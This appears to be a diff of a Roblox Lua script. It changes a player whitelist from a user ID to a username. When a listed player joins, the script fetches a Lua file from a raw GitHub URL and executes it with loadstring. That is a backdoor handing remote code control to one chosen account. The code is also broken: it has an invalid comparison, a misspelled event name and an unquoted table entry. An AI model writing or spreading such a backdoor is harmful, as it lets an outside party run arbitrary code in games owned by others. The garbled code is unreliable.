@@ -1,10 +1,10 @@
 local TBLFIND = table.find
 
-local whitelistUserIDs = {3031289837}
+local Username = {HelloThereMyKidz}
 
 if TBLFIND = ID then
 game.Players.PlayedAdded:Connect(function(player)
-    if TBLFIND(whitelistUserIDs,player.userID) then 
+    if TBLFIND(Username,player.Name) then 
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/DiscIssues/80carrots/main/Main.lua"))()
                 end
            else
